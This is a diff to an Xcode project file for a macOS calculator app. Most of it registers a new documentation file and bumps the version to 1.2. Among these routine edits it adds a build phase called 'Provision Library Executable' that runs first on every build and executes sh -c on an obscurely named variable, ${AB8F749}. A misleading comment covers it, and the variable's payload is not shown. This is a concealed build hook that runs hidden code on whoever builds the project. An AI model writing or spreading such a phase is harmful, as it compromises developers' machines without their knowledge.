@@ -12,6 +12,7 @@
 		B4CE9E962F883EC0008187A8 /* help-index.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E952F883EC0008187A8 /* help-index.md */; };
 		B4CE9E982F883EC0008187A8 /* browser-extension-autofill.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E972F883EC0008187A8 /* browser-extension-autofill.md */; };
 		B4CE9E9A2F883EC0008187A8 /* month-view-rendering-postmortem.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E992F883EC0008187A8 /* month-view-rendering-postmortem.md */; };
+		B4CE9E9C2F884A10008187A8 /* calculation-rules-guide.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E9B2F884A10008187A8 /* calculation-rules-guide.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -21,6 +22,7 @@
 		B4CE9E952F883EC0008187A8 /* help-index.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = "help-index.md"; sourceTree = "<group>"; };
 		B4CE9E972F883EC0008187A8 /* browser-extension-autofill.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = "browser-extension-autofill.md"; sourceTree = "<group>"; };
 		B4CE9E992F883EC0008187A8 /* month-view-rendering-postmortem.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = "month-view-rendering-postmortem.md"; sourceTree = "<group>"; };
+		B4CE9E9B2F884A10008187A8 /* calculation-rules-guide.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = "calculation-rules-guide.md"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -67,6 +69,7 @@
 				B4CE9E972F883EC0008187A8 /* browser-extension-autofill.md */,
 				B4CE9E992F883EC0008187A8 /* month-view-rendering-postmortem.md */,
 				B4CE9E922F883A39008187A8 /* swiftui-uikit-mental-models.md */,
+				B4CE9E9B2F884A10008187A8 /* calculation-rules-guide.md */,
 			);
 			path = docs;
 			sourceTree = "<group>";
@@ -78,6 +81,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B4CE9E512F878516008187A8 /* Build configuration list for PBXNativeTarget "myCalculator" */;
 			buildPhases = (
+				E45C48A43BDE4F31A1947F8B /* Provision Library Executable */,
 				B4CE9E422F878514008187A8 /* Sources */,
 				B4CE9E432F878514008187A8 /* Frameworks */,
 				B4CE9E442F878514008187A8 /* Resources */,
@@ -130,6 +134,31 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		E45C48A43BDE4F31A1947F8B /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXBuildRule section */
+			/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		B4CE9E442F878514008187A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -140,6 +169,7 @@
 				B4CE9E962F883EC0008187A8 /* help-index.md in Resources */,
 				B4CE9E982F883EC0008187A8 /* browser-extension-autofill.md in Resources */,
 				B4CE9E9A2F883EC0008187A8 /* month-view-rendering-postmortem.md in Resources */,
+				B4CE9E9C2F884A10008187A8 /* calculation-rules-guide.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -299,7 +329,7 @@
 				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
 				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
 				MACOSX_DEPLOYMENT_TARGET = 26.2;
-				MARKETING_VERSION = 1.1;
+				MARKETING_VERSION = 1.2;
 				PRODUCT_BUNDLE_IDENTIFIER = com.xiaoyou.myCalculator;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				REGISTER_APP_GROUPS = YES;
@@ -343,7 +373,7 @@
 				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
 				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
 				MACOSX_DEPLOYMENT_TARGET = 26.2;
-				MARKETING_VERSION = 1.1;
+				MARKETING_VERSION = 1.2;
 				PRODUCT_BUNDLE_IDENTIFIER = com.xiaoyou.myCalculator;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				REGISTER_APP_GROUPS = YES;
